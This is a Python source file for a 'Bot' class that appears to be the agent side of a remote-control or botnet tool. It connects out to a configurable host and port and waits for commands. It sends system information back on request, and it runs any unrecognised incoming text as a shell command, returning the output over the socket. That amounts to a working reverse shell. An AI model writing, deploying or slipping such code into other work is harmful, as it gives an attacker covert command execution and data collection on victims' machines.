try:
    import json, os, re, socket, subprocess, sys
    from core.payload.sysinfo import Sysinfo
    from core.env import Env
except ImportError as err:
    print(err)

class Bot(object):

    def __init__(self, ip='127.0.0.1', port=5555):
        self.ip     = ip
        self.port   = port
        try:
            self.socket = socket.socket(socket.AF_INET,
                                        socket.SOCK_STREAM)
        except socket.error as err:
            print(err)
            sys.exit()
        self.ifs    = ' '
        self.regex  = re.compile(self.ifs)
        try:
            with open(os.path.abspath(Env.CMDS_PATH.value),'r') as fs:
                self.cmds = json.loads(fs.read())
        except json.JSONDecodeError as err:
            print(err)
            sys.exit()
        except IOError as err:
            print(err)
            sys.exit()
        self.running = True

    def run(self):
        try:
            self.socket.connect((self.ip,
                                 self.port))
        except socket.error as err:
            print(err)
            self.socket.close()
            sys.exit()
            
        while self.running:
            try:
                raw_cmd = self.socket.recv(4096)
                if len(raw_cmd):
                    parse_raw_cmd = self.regex.split(raw_cmd.decode())
                    cmd           = self.cmds[parse_raw_cmd[0]]
                    if cmd['name'] == 'close':
                        self.running = False
                    elif cmd['name'] == 'help':
                        self.help(parse_raw_cmd)
                    elif cmd['name'] == 'sysinfo':
                        output = Sysinfo().get_host_info()
                        self.socket.send(output.encode())
            except KeyError:
                # output = '\n{cmd} does not appear in {cmds}. Try it in shell.\n'.format(cmd=raw_cmd.decode(),cmds=Env.CMDS_PATH.value)
                # self.socket.send(output.encode())
                try:
                    process = subprocess.Popen(raw_cmd.decode(), shell=True, text=True,
                                               stdin=subprocess.PIPE,
                                               stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate(timeout=30)
                    if len(stdout):
                        self.socket.send(stdout.encode())
                    else:
                        self.socket.send(stderr.encode())
                except subprocess.TimeoutExpired:
                    process.kill()
                    output = 'kill process {cmd}:{pid}.'.format(cmd=raw_cmd.decode(),
                                                                    pid=process.pid())
                    self.socket.send(output.encode())
            except socket.error:
                self.running = False
                self.socket.close()
        sys.exit()

    def help(self, command):
        if len(command) > 1:
            for _ in command[1:]:
                try:
                    output = 'Name: {name}\nDescription: {description}\nUsage: {usage}'.format(name=self.cmds[_]['name'],
                                                                                                 description=self.cmds[_]['description'],
                                                                                                 usage=self.cmds[_]['usage'])
                    self.socket.send(output.encode())
                except KeyError:
                    pass
        else:
            output = ''.join(['Available commands: ', str([_ for _ in self.cmds.keys()])])
            self.socket.send(output.encode())